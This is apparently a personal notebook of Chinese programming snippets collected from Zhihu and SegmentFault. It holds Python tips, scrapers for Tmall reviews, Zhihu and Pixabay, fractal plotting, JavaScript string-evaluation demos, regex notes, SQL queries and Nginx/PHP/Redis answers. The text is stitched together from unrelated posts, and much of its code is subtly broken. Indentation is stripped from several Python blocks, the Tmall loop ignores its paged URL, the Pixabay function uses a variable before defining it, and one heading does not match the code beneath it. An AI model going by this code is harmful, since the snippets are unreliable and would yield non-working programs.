https://segmentfault.com/q/1010000008691659  基于 session 和基于 token 的用户认证方式到底该如何选择？
二维数组合并成三维数组https://segmentfault.com/q/1010000008691370

DateTime对象可以用时间戳的哦 203v问题是由于整数溢出造成的，32位整数就会遇到，64位就不会。这和你的程序架构有关，如果你运行的是32位PHP的话就会溢出。
###[生成自己的词性词典](邓旭东 天善大数据http://mp.weixin.qq.com/s?src=3&timestamp=1489907873&ver=1&signature=mPVOF3R4tcsLs1L1Phi9*juQlHCeGtA4kbe8bgSyrJVW7msRydAK1ggmQMUBfPJ5ti-82g9Edo33VwXGCwnoSKdefoxNNYd4NOC1whlrQOA3owzlgqS-P4TQaIuvvNQLCZNs5s-Nz5VySSIOnCy9iMrdxmtGBZFKoPzIuVZjnpU=)
```js
import re
1、应先使用正则表达式，匹配含有‘adj’的行字符串，返回的是list。
2、获得adj结尾处的索引值
3、对行字符串进行切片处理，获得索引值后的全部字符
4、如果获得的字符串有 ‘，’ 那再用正则表达式，匹配中文字符，获得的是中文的list
strs = open(r'C:/Users/myl/Desktop/SegChineseToWords/英汉词典TXT格式.txt','r',encoding='utf-8').readlines()

for str in strs:

# 形容词典
    adj_re = re.search('adj', str)
    if adj_re != None:
        adj_num = adj_re.end()+1
        adj_str = str[adj_num:]
        adj_list = re.findall("[\u4e00-\u9fa5]+", adj_str)
        for ele_adj in adj_list:
            ele_adj = ele_adj + '\n'
            with open(r'C:/Users/myl/Desktop/SegChineseToWords/Dict/adj_dict.txt', 'a+',encoding='utf-8') as f:
                f.write(ele_adj)
```

###[有哪些老鸟程序员知道而新手不知道的小技巧？](https://www.zhihu.com/question/36426051/answer/152115740)
```js
>>> x = 5
>>> 1 < x < 10
True
>>> 10 < x < 20 
False
>>> x < 10 < x*10 < 100
True
>>> 10 > x <= 9
True
>>> 5 == x > 4
True
x = [n for n in foo if bar(n)]
>>> type(x)
<type 'list'>

d = {value: foo(value) for value in sequence if bar(value)}
>>> def foo(x=None):
...     if x is None:
...         x = []
...     x.append(1)
...     print x
>>> foo()
[1]
>>> foo()
[1]
如果你不喜欢使用空格缩进，那么可以使用C语言花括号{}定义函数：

>>> from __future__ import braces   #这里的braces 指的是：curly braces（花括号）
  File "<stdin>", line 1
SyntaxError: not a chance
当然这仅仅是一个玩笑，想用花括号定义函数？没门。感兴趣的还可以了解下：

from __future__ import barry_as_FLUFL
装饰器使一个函数或方法包装在另一个函数里头，可以在被包装的函数添加一些额外的功能，比如日志，还可以对参数、返回结果进行修改。

>>> def print_args(function):
>>>     def wrapper(*args, **kwargs):
>>>         print 'Arguments:', args, kwargs
>>>         return function(*args, **kwargs)
>>>     return wrapper

>>> @print_args
>>> def write(text):
>>>     print text

>>> write('foo')
Arguments: ('foo',) {}
foo
@是语法糖，它等价于：

>>> write = print_args(write)
>>> write('foo')
arguments: ('foo',) {}
foo




```
[Python 绘制分形图（曼德勃罗集、分形树叶、科赫曲线、分形龙、谢尔宾斯基三角等）附代码](https://zhuanlan.zhihu.com/p/25792397)
```js
import numpy as np
import matplotlib.pyplot as pl
import time

# 蕨类植物叶子的迭代函数和其概率值
eq1 = np.array([[0,0,0],[0,0.16,0]])
p1 = 0.01

eq2 = np.array([[0.2,-0.26,0],[0.23,0.22,1.6]])
p2 = 0.07

eq3 = np.array([[-0.15, 0.28, 0],[0.26,0.24,0.44]])
p3 = 0.07

eq4 = np.array([[0.85, 0.04, 0],[-0.04, 0.85, 1.6]])
p4 = 0.85

def ifs(p, eq, init, n):
"""
    进行函数迭代
    p: 每个函数的选择概率列表
    eq: 迭代函数列表
    init: 迭代初始点
    n: 迭代次数

    返回值： 每次迭代所得的X坐标数组， Y坐标数组， 计算所用的函数下标    
    """

# 迭代向量的初始化
pos = np.ones(3, dtype=np.float)
pos[:2] = init

# 通过函数概率，计算函数的选择序列
p = np.add.accumulate(p)    
rands = np.random.rand(n)
select = np.ones(n, dtype=np.int)*(n-1)
for i, x in enumerate(p[::-1]):
select[rands<x] = len(p)-i-1

# 结果的初始化
result = np.zeros((n,2), dtype=np.float)
c = np.zeros(n, dtype=np.float)

for i in range(n):
eqidx = select[i] # 所选的函数下标
tmp = np.dot(eq[eqidx], pos) # 进行迭代
pos[:2] = tmp # 更新迭代向量

# 保存结果
result[i] = tmp
c[i] = eqidx

return result[:,0], result[:, 1], c

start = time.clock()
x, y, c = ifs([p1,p2,p3,p4],[eq1,eq2,eq3,eq4], [0,0], 100000)
time.clock() - start
pl.figure(figsize=(6,6))
pl.subplot(121)
pl.scatter(x, y, s=1, c="g", marker="s", linewidths=0)
pl.axis("equal")
pl.axis("off")
pl.subplot(122)
pl.scatter(x, y, s=1,c = c, marker="s", linewidths=0)
pl.axis("equal")
pl.axis("off")
pl.subplots_adjust(left=0,right=1,bottom=0,top=1,wspace=0,hspace=0)
pl.gcf().patch.set_facecolor("#D3D3D3")
pl.show()
```
[人人都爱数据科学家！Python数据科学精华实战课程系列教程连载 ----长期更新中，敬请关注!](https://zhuanlan.zhihu.com/p/25829702)
[就用python爬淘宝评论](https://zhuanlan.zhihu.com/p/25840330)
```js
import requests
import json
import time
import simplejson

headers = {
    'Connection': 'keep-alive',
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:51.0) Gecko/20100101 Firefox/51.0'
}
base_url = 'https://rate.tmall.com/list_detail_rate.htm?itemId=38975978198&' \
           'spuId=279689783&sellerId=92889104&order=3&callback=jsonp698'
#在base_url后面添加&currentPage=1就可以访问不同页码的评论

for i in range(2, 98, 1):
    url = base_url + '&currentPage=%s' % str(i)
    #将响应内容的文本取出
    tb_req = requests.get(base_url, headers=headers).text[12:-1]
    print(tb_req)

    #将str格式的文本格式化为字典
    tb_dict = simplejson.loads(tb_req)

    #编码： 将字典内容转化为json格式对象
    tb_json = json.dumps(tb_dict, indent=2)   #indent参数为缩紧，这样打印出来是树形json结构，方便直观
    #print(type(tb_json))

    #print(tb_json)
    #解码： 将json格式字符串转化为python对象
    review_j = json.loads(tb_json)
    for p in range(1, 20, 1):
        print(review_j["rateDetail"]["rateList"][p]['rateContent'])
    time.sleep(1)
```
[Python网络爬虫免费视频](https://zhuanlan.zhihu.com/p/25828596)
爬取知乎所有用户信息
```js
import jieba
import time

path = r'E:\Python\Projects\Dig_text\云麓园\云麓水吧.txt'
read_txt = open(path, 'r')
ShuiBa_word_list = []
ShuiBa_word_set = set()
for line in read_txt.readlines():
line = line.replace(' ', '')
line = line.strip('\n')
word_list = jieba.lcut(line, cut_all=False)  #cut_all=false精准模式
word_set = set(word_list)
# 汇总水吧的所有词语的列表（有顺序，重复）
ShuiBa_word_list = ShuiBa_word_list + word_list
# 得到水吧所有词语的集合（无顺序，不重复）
ShuiBa_word_set = ShuiBa_word_set.union(word_set)

for word in ShuiBa_word_set:
fre = ShuiBa_word_list.count(word)
print(word, str(fre))  #打印词语及其频率
```
[使用selenium简单收集知乎的话题数据](https://zhuanlan.zhihu.com/p/25803780)
```js
import re
import csv
import time
import urllib.parse as parse
from selenium import webdriver
from bs4 import BeautifulSoup

# keyword话题名 ，filename保存数据的文件名，page_num收集多少页
def topic_title_spider(keyword='王宝强', filename = 'wangbaoqiang', page_num = 10):

start = time.time()

# 建立一个收集数据的csv文件
csvFile = open(r'E:\%s.csv'% filename, 'a+', newline='')
writer = csv.writer(csvFile)
writer.writerow(('title', 'review_num'))

# 将关键词转换为十六进制格式，填入到链接中
kw = parse.quote(keyword)
driver = webdriver.Firefox()
driver.get('https://www.zhihu.com/search?type=content&q=%s' % kw)

# 正则表达式，用来匹配标题，评论数
reg_title = re.compile(r'<a class="js-title-link" href=.*?" target="_blank">(.*?)</a>')
reg_li = re.compile(r'item clearfix.*?')
reg_num = re.compile(r'<a class="zm-item-vote-count hidden-expanded js-expand js-vote-count" data-bind-votecount="">(.*?)</a>')

# 先循环点击页面底部“更多”，加载尽可能多的页面数据
for i in range(1, page_num, 1):
driver.find_element_by_link_text("更多").click()
duration = time.time()-start
print('%s小爬虫 已经跑到 第%d页 了，运行时间%.2f秒，好累啊'%(keyword, i, duration))
time.sleep(5)

soup = BeautifulSoup(driver.page_source, 'lxml')
li_s = soup.find_all('li', {'class': reg_li})

for li in li_s:
li = str(li)
try:
title = re.findall(reg_title, li)[0]
title = title.replace('<em>', '')
title = title.replace('</em>', '')
review_num = re.findall(reg_num, li)[0]
except:
continue
writer.writerow((title, review_num))
print(title, review_num)

csvFile.close()
driver.quit()
```
[Python爬虫实战——免费图片 - Pixabay](https://zhuanlan.zhihu.com/p/25863566?group_id=826853788479557632)
pixabay.com/  http://link.zhihu.com/?target=https%3A//github.com/zhangslob/Pixabay/tree/master 
```js
import requests
from lxml import etree
import time
import urllib

def Download(url):
    header = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36'}
    r = s.get(url, headers=header).text
    s = etree.HTML(r)
    r = s.xpath('//img/@data-lazy')
    for i in r:
        imglist = i.replace('__340', '_960_720')
        name = imglist.split('/')[-1]#图片名称
        urllib.request.urlretrieve(imglist,name)
        time.sleep(1)


def FullUrl():
    full_link = []
    for i in range(2,165):
        #print(i)
        full_link.append( 'https://pixabay.com/zh/editors_choice/?media_type=photo&pagi='+ str(i))
        #print(full)
    return full_link

if __name__ == '__main__':
    urls = FullUrl()
    for url in urls:
        Download(url)
In [13]: import requests

In [14]: r = requests.get('https://pixabay.com/zh/editors_choice/')

In [15]: soup = BeautifulSoup(r.text, 'lxml')

In [16]: for img in soup.find_all('img',attrs={'data-lazy-srcset':True}):
    ...:     
    ...:     print(img['data-lazy-srcset'])

```
[异常JSON字符串的解析以及JS字符串的解析运行](https://zhuanlan.zhihu.com/p/25693482)
```js
var str = "{a: 1, 'b': 2}"; 
[].push.constructor('console.log("abc");')(); // abc
Math.max.constructor('console.log("abc");')(); // abc [].push.constructor === Function // true
var script = document.createElement('script');
var txt = document.createTextNode('console.log("abc");');
script.appendChild(txt);
document.body.appendChild(script); // abc
当让，也可以通过把字符串转化为二进制然后通过window.URL.createObjectURL生成URL修改script的src。

var blob = new Blob(['console.log("abc");']);
var src = window.URL.createObjectURL(blob);
var script = document.createElement('script');
script.src = src;
document.body.appendChild(script); // abc
var blob = new Blob(['console.log("abc");']);
var src = window.URL.createObjectURL(blob);
new Worker(src); // abc  

location.href='javascript:' + 'console.log("abc")'; // abc

var str = 'var i = 0; var arr = [i++, i++, i++]';
eval(str);
console.log(arr); // [0,1,2]
var str = new Array(6).join('i++,'); // 'i++,i++,i++,i++,i++,'

// var str = 'i++,'.repeat(5) 当然，这样写也OK
var evalstr = 'var i = 0; var arr = [' + str + ']';
eval(evalstr);
console.log(arr); // [0, 1, 2, 3, 4, 5]
```

[无循环 JavaScript](https://zhuanlan.zhihu.com/p/25370825?group_id=826839568971071488)
[正则表达式中的lastIndex以及预查](https://zhuanlan.zhihu.com/p/25793949)
```js
var reg1 = /a/;
var reg2 = /a/g;

console.log(reg1.test('abcabc')); // true
console.log(reg1.test('abcabc')); // true
console.log(reg1.test('abcabc')); // true
console.log(reg1.test('abcabc')); // true

console.log(reg2.test('abcabc')); // true
console.log(reg2.test('abcabc')); // true
console.log(reg2.test('abcabc')); // false
console.log(reg2.test('abcabc')); // true
var reg = /ab/g;
reg.test('123abc');
console.log(reg.lastIndex) // 5

// 匹配内容在最后
var reg = /ab/g;
reg.test('123ab');
console.log(reg.lastIndex) // 5

// 不带参数g
var reg = /ab/;
reg.test('123abc');
console.log(reg.lastIndex) // 0
// 测试字符串str1 和 str2 是否都含有ab字符
var reg = /ab/g;

var str1 = '123ab';
var str2 = 'ab123';

console.log(reg.test(str1)); // true
console.log(reg.test(str2)); // false
```
[python小甜点-----100行代码实现个性化翻译！](https://zhuanlan.zhihu.com/p/25818996?group_id=825858731395940352)
[在线的链接维基百科的思维导图工](https://zhuanlan.zhihu.com/p/25816988?group_id=825804887966248960)
搜狗人物关系 、百度人物图谱http://link.zhihu.com/?target=http%3A//tupu.baidu.com/tupu/131804.html
http://link.zhihu.com/?target=http%3A//wikimindmap.com/viewmap.php%3Fwiki%3Den.wikipedia.org
http://link.zhihu.com/?target=https%3A//index.baidu.com/%3Ftpl%3Ddemand%26word%3D%25B9%25F9%25B5%25C2%25B8%25D9
http://link.zhihu.com/?target=http%3A//www.sogou.com/tupu/person.html%3Fq%3D%25E9%2583%25AD%25E5%25BE%25B7%25E7%25BA%25B2
以看直播电视：在线电视http://link.zhihu.com/?target=https%3A//tv.empire.net.cn/
[关于跨域，你想知道的全在这里](https://zhuanlan.zhihu.com/p/25778815?group_id=825753771505233920)
我们正好在开发一个小工具，辅助微信编辑的，挺吻合题主的需求。

这个小工具叫做「壹伴」，很小巧的一款浏览器插件，大小不到1M。https://link.zhihu.com/?target=http%3A//yiban.io/%3Futm%3Dxiaojiqiao
[是最有艺术感的二维码了吧](https://zhuanlan.zhihu.com/p/25779045?group_id=825323688302907392)
http://link.zhihu.com/?target=https%3A//www.imayan.net/QrBuild/Index/Builder.html
http://link.zhihu.com/?target=http%3A//www.9thws.com/%23 

[爬虫入门到精通-headers的详细讲解（模拟登录知乎）](https://zhuanlan.zhihu.com/p/25711916?group_id=825423128233656320)
```js
from lxml import etree
sel = etree.HTML(z1.content)
# 这个xsrf怎么获取 我们上面有讲到
_xsrf = sel.xpath('//input[@name="_xsrf"]/@value')[0]

mylog = 'https://www.zhihu.com/people/pa-chong-21/logs'
z3 = requests.get(url=mylog,headers=headers)
print z3.status_code
#200
print z3.url
# u'https://www.zhihu.com/?next=%2Fpeople%2Fpa-chong-21%2Flogs'
headers={cookie:z2.headers['set-cookie']}
z3 = requests.get(url=mylog,headers=headers)
print z3.url
print z3.request.headers 打印看下我们请求的headers
# u'https://www.zhihu.com/people/pa-chong-21/logs'
```
Python的zipfile模块提供的命令行接口，创建、查看和提取zip格式压缩包：
lmx@host1:~/temp$ python -c "import paramiko"
python -m zipfile -c monty.zip spam.txt eggs.txt
python -m zipfile -e monty.zip target-dir/
python -m zipfile -l monty.zip
[初学Python--微信好友/群消息防撤回，查看相关附件](https://zhuanlan.zhihu.com/p/25744154?group_id=824799146052587520)
[教你免费搭建个人博客，Hexo&Github](https://zhuanlan.zhihu.com/p/25729240?group_id=824595631568998400)
[爬虫入门到精通-爬虫之异步加载（实战花瓣网](https://zhuanlan.zhihu.com/p/25860823?group_id=826823016343302144)

python md5之后是base64 encode

java md5之后是base64 decode
[Fetch 跨域请求时默认不会带 cookie，需要时得手动指定 credentials: 'include'](https://segmentfault.com/q/1010000008709916)

fetch('a.com/api', {credentials: 'include'}).then(function(res) {
    // ...
})
[查看Beautiful Soup的prettify(encoding, formatter="minimal")](https://segmentfault.com/q/1010000008743981)
In [1]: import bs4

In [2]: bs4.BeautifulSoup.prettify.__code__
Out[2]: <code object prettify at 0x103f7f5d0, file "/Library/Frameworks/Python.framework/Versions/3.5/lib/python3.5/site-packages/bs4/element.py", line 1198>
[用python求差商？](https://segmentfault.com/q/1010000008744969)
```js

fmap = {1:1, 2:2, 3:3}

def f(*x):
    if len(x)==1:
        rc = fmap[x[0]]
        print('f({})={}'.format(x[0], rc))
        return rc
    rc = (f(*x[1:])-f(*x[:-1]))/(x[-1]-x[0])
    template = 'f({})=(f({})-f({}))/({}-{})={}'
    print(template.format(', '.join([str(i) for i in x]),
                          ', '.join([str(i) for i in x[1:]]),
                          ', '.join([str(i) for i in x[:-1]]),
                          x[-1], x[0],
                          rc))
    return rc
    
f(1, 2, 3)
f(3)=3
f(2)=2
f(2, 3)=(f(3)-f(2))/(3-2)=1.0
f(2)=2
f(1)=1
f(1, 2)=(f(2)-f(1))/(2-1)=1.0
f(1, 2, 3)=(f(2, 3)-f(1, 2))/(3-1)=0.0
```
152753这个字符串转变成时间格式15:27:53 https://segmentfault.com/q/1010000008716602

from datetime import datetime
s = '152753'
t = datetime.strptime(s, '%H%M%S').time()

print(t)
15:27:53
 >>> time = "152753"
 >>> ':'.join(time[i:i+2] for i in range(0, len(time), 2))
 >>> '15:27:53'
import pandas as pd

a = pd.read_csv('./test.csv')

a.to_excel('./test_output.xlsx', index=False)

a.to_excel('./test_output.csv', index=False)
Python列表或者字典里面的中文如何处理https://segmentfault.com/q/1010000008664310
>>> list
[u'\u4e2d\u6587', u'\u6211\u662f\u4e2d\u6587', u'\u6211\u8fd8\u662f\u4e2d\u6587']
>>> list[0]
u'\u4e2d\u6587'
>>> list[0].encode('utf8')
'\xe4\xb8\xad\xe6\x96\x87'
>>> str = list[0].encode('utf8')
>>> print str
中文
import json
zhlist = [u'中文', u'英文']
print json.dumps(zhlist, ensure_ascii=False, indent=2)
Nginx服务器如何配置Laravel项目？总是报502 Bad Gatewayhttps://segmentfault.com/q/1010000008713658
location / {
        try_files $uri /index.php$is_args$args;
    }
    
    location ~ ^/index\.php(/|$) {
        fastcgi_pass unix:/run/php-fpm/php-fpm.sock;  fastcig_pass 就是php-fpm运行时候的服务,可以用tcp/ip方式访问，也可以通过这中socket的方式
        fastcgi_split_path_info ^(.+\.php)(/.*)$;
        include fastcgi_params;
        fastcgi_param SCRIPT_FILENAME $realpath_root$fastcgi_script_name;
        fastcgi_param DOCUMENT_ROOT $realpath_root;
    }
如何一条SQL从一张表中取出关联字段值分别为A/B/C的数据一个取出N条https://segmentfault.com/q/1010000008576146
SELECT * FROM s_area AS a
WHERE area_parent_id in (3,4,5) and 5 > ( SELECT COUNT(*) FROM s_area WHERE area_parent_id = a.area_parent_id AND area_id>a.area_id) 
order by area_sort asc
PHP队列执行任务的时候,如何防止进程之间抢夺资源?https://segmentfault.com/q/1010000008732536
PHP 进程都用如下 SQL 语句去取出数据库里的待处理任务

SELECT * FROM task WHERE status = 0
取出来以后，我们为了防止其他用户不再重复取出要把它的状态标记为 1

UPDATE task SET status = 1 WHERE id = xxx
但是等等，这样就会产生如你所说的资源抢夺，但如果加上一个简单的技巧就可以避免，你把语句变成这样

UPDATE task SET status = 1 WHERE id = xxx AND status = 0

redis做一个队列，为什么出队列是会少显示一个元素？https://segmentfault.com/q/1010000008700710

```js
    <?php
    $redis = new \redis();
    $redis->connect('127.0.0.1', 6379);
    $arr = array('h', 'e', 'l', 'l', 'o', 'w', 'o', 'r', 'l', 'd');
    foreach ($arr as $k => $val) { //入队
        $redis->rpush('list', $val);
    }
    echo "队列总长度：".$redis->lLen('list');
    echo "<br/>";
    
    while (true) { //出对
        $get = $redis->lpop('list');
        if ($get) {
            echo '出队列--' . $get;
            echo '<br/>';
        } else {
            echo '出队完成';
            return false;
        }
    
    }
    这是你的代码，没有呀
    
队列总长度：10
出队列--h
出队列--e
出队列--l
出队列--l
出队列--o
出队列--w
出队列--o
出队列--r
出队列--l
出队列--d
出队完成
    
    sql问题（店铺 商家 活动的sql）https://segmentfault.com/q/1010000008744776
    select shopname,level,group_concat(actname) from(select shop.shopname,user.level,activity.actname from shop inner join user on shop.shopid = user.shopid inner join activity on shop.shopid = activity.shopid) group by shopname,level
    ￼
```
像很多网站(比如电商)里的筛选功能一般是如何实现的？https://segmentfault.com/q/1010000008645411 

https://segmentfault.com/q/1010000008671774
数据隔离级别，一般是在数据启动的配置文件中设置好的，没有特殊场景的话不需要在程序代码中设置。

对于一些需要独占资源的操作，需要在代码中使用SELECT ... FOR UPDATE类似的代码加锁，然后通过COMMIT/ROLLBACK进行事务处理，数据库自己会释放对应的锁。
php 定时执行任务问题https://segmentfault.com/q/1010000008671224
redis 做一个以mysql时间字段为触发时间的服务 定时推送

具体 你可以找下redis实现的步骤！redis肯定可以实现！

MySQL 5.7 以上版本默认禁止 0000-00-00 的日期。在 MySQL 的配置文件 [mysqld] 区域添加

sql_mode="ONLY_FULL_GROUP_BY,STRICT_TRANS_TABLES,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION"
然后重启 MySQLhttps://segmentfault.com/q/1010000008666236 
MySQL 隐式转化啊 
SELECT 1='1w';

结果是 1 就是 TRUE
积分返还算法求解https://segmentfault.com/q/1010000008652947 
mysql如何处理数据变化中的事务https://segmentfault.com/q/1010000008655798
事务这块在程序控制，一般不要数据库自己的事务机制
mysql proxy怎么做代理https://segmentfault.com/q/1010000008697657
http://coolerfeng.blog.51cto.com/133059/90231/
如何保证两次操作都达到预期效果https://segmentfault.com/q/1010000008685406
status ASC, (case when FROM_UNIXTIME(end_date,'%Y%m%d%H%i') > '".date('YmdHi')."' then 1 else 0 end) DESC, start_date ASC, end_date ASC,create_date ASC "; 这句sql应该是php拼接的，date('YmdHi')是当前时间。end_data比当前时间大的为1反之为0，然后根据这个数值降序，前排显示未结束的纪录 https://segmentfault.com/q/1010000008685489
https://segmentfault.com/q/1010000008676874 
php PDO的模拟预编译语句和本地预处理语句区别https://segmentfault.com/q/1010000008671265
开发的时候最好是加上这句$pdo->setAttribute(PDO::ATTR_EMULATE_PREPARES,false)，这样如果支持本地预处理则会使用本地预处理，在不支持的情况下会自动使用模拟预处理方式。
mysql索引的疑惑？？
https://segmentfault.com/q/1010000007931752
sql 左连接结果union右连接结果https://segmentfault.com/q/1010000008632475
select t.a , sum(t.b) from (
select t1.a , b from t1 
union all
select t2.a , 0-b from t2
) t group by t.a
find_in_sethttps://segmentfault.com/q/1010000008719869
SELECT * FROM `table_name` WHERE FIND_IN_SET('0',`b_leibie`);



